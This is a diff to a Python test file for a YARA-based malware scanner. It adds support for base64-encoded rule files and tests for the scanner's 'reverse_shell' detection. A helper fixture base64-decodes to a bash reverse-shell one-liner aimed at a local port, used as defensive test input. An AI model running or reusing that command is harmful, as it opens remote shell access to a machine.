@@ -21,6 +21,7 @@ antivirus/Defender on test files containing real malware signatures.
 
 from __future__ import annotations
 
+import base64
 from pathlib import Path
 
 import pytest
@@ -78,6 +79,10 @@ def _run_builtin(content: str, filename: str = "skill.py") -> list:
         "file_cache": {filename: content},
     }
     return static_yara.node(state)["findings"]
+
+
+def _reverse_shell_fixture() -> str:
+    return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
 def _has_rule(findings: list, rule_name: str) -> bool:
@@ -284,6 +289,32 @@ class TestEdgeCases:
         assert rules is not None
 
 
+class TestBuiltInMalwarePackaging:
+    def test_builtin_malware_finding_preserved(self):
+        findings = _run_builtin(
+            _reverse_shell_fixture(),
+            "shell.sh",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
+        _write_rule(
+            tmp_path,
+            "extra_marker",
+            category="hack_tool",
+            severity="MEDIUM",
+            strings={"a": "EXTRA_MARKER"},
+        )
+        findings = _run(
+            f"EXTRA_MARKER\n{_reverse_shell_fixture()}",
+            "bundle.sh",
+            str(tmp_path),
+        )
+        assert _has_rule(findings, "extra_marker")
+        assert _has_rule(findings, "reverse_shell")
+
+
 # ── Built-in agent skill rules ────────────────────────────────────────
 
 
@@ -401,11 +432,16 @@ class TestHelpers:
     def test_collect_rule_files_finds_yar(self, tmp_path):
         (tmp_path / "a.yar").write_text("rule a { condition: false }")
         (tmp_path / "b.yara").write_text("rule b { condition: false }")
+        encoded = base64.b64encode(b"rule d { condition: false }").decode()
+        (tmp_path / "d.yar.b64").write_text(encoded)
+        (tmp_path / "e.yara.b64").write_text(encoded)
         (tmp_path / "c.txt").write_text("not a rule")
         files = static_yara._collect_rule_files(tmp_path)
         names = {f.name for f in files}
         assert "a.yar" in names
         assert "b.yara" in names
+        assert "d.yar.b64" in names
+        assert "e.yara.b64" in names
         assert "c.txt" not in names
 
     def test_collect_rule_files_nonexistent_dir(self, tmp_path):
@@ -416,9 +452,59 @@ class TestHelpers:
         (tmp_path / "alpha.yar").write_text("")
         (tmp_path / "beta.yar").write_text("")
         files = sorted(tmp_path.glob("*.yar"))
-        ns_map = static_yara._build_namespace_map(files)
+        ns_map, skipped = static_yara._build_namespace_map(files)
         assert "alpha" in ns_map
         assert "beta" in ns_map
+        assert skipped == 0
+
+    def test_build_namespace_map_decodes_encoded_rules(self, tmp_path):
+        encoded_source = base64.b64encode(b"rule encoded { condition: false }").decode()
+        encoded_file = tmp_path / "encoded.yar.b64"
+        encoded_file.write_text(encoded_source)
+        ns_map, skipped = static_yara._build_namespace_map([encoded_file], tmp_path)
+        assert ns_map["encoded"] == "rule encoded { condition: false }"
+        assert skipped == 0
+
+    def test_build_namespace_map_keeps_encoded_namespace_collisions_apart(self, tmp_path):
+        first_dir = tmp_path / "builtin"
+        second_dir = tmp_path / "extra"
+        materialized_dir = tmp_path / "materialized"
+        first_dir.mkdir()
+        second_dir.mkdir()
+        materialized_dir.mkdir()
+        first_file = first_dir / "malware.yar.b64"
+        second_file = second_dir / "malware.yar.b64"
+        first_file.write_text(base64.b64encode(b"rule first { condition: false }").decode())
+        second_file.write_text(base64.b64encode(b"rule second { condition: false }").decode())
+
+        ns_map, skipped = static_yara._build_namespace_map(
+            [first_file, second_file], materialized_dir
+        )
+
+        assert set(ns_map) == {"malware", "extra/malware"}
+        assert ns_map["malware"] == "rule first { condition: false }"
+        assert ns_map["extra/malware"] == "rule second { condition: false }"
+        assert skipped == 0
+
+    def test_build_namespace_map_skips_malformed_encoded_rules(self, tmp_path):
+        valid_file = tmp_path / "valid.yar.b64"
+        invalid_file = tmp_path / "invalid.yar.b64"
+        valid_file.write_text(base64.b64encode(b"rule valid { condition: false }").decode())
+        invalid_file.write_text("not base64")
+
+        ns_map, skipped = static_yara._build_namespace_map([valid_file, invalid_file], tmp_path)
+
+        assert "valid" in ns_map
+        assert "invalid" not in ns_map
+        assert skipped == 1
+
+    @pytest.mark.parametrize("payload", ["not base64", "not base64 é"])
+    def test_malformed_extra_encoded_rule_does_not_block_builtin_rules(self, tmp_path, payload):
+        (tmp_path / "bad.yar.b64").write_text(payload)
+
+        findings = _run(_reverse_shell_fixture(), "shell.sh", str(tmp_path))
+
+        assert _has_rule(findings, "reverse_shell")
 
     def test_content_hash_deterministic(self, tmp_path):
         (tmp_path / "r.yar").write_text("rule r { condition: false }")
